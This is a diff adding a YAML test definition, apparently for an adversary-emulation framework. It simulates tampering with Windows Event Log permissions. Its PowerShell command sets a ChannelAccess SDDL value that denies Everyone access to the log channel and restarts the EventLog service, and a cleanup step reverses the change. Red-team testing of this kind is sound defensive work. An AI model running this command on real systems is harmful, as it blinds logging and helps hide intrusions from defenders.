@@ -1,0 +1,19 @@
+- id: 54360ef8-8d8f-556f-8a91-4d5e558c3621
+  name: Soumaia ART Tests - Modify Event Log Channel Access Permissions via Registry 2 - PowerShell
+  description: 'This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the "ChannelAccess" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.
+
+    Upon execution, the user shouldn''t be able to access the event log channel via the event viewer or via utilities such as "Get-EventLog" or "wevtutil". (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.001
+    name: 'Disable or Modify Tools: Disable or Modify Windows Event Log'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          New-Item -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Force
+          Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
+          Restart-Service -Name EventLog -Force -ErrorAction Ignore
+        cleanup: |-
+          Remove-Item -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Force
+          Restart-Service -Name EventLog -Force -ErrorAction Ignore
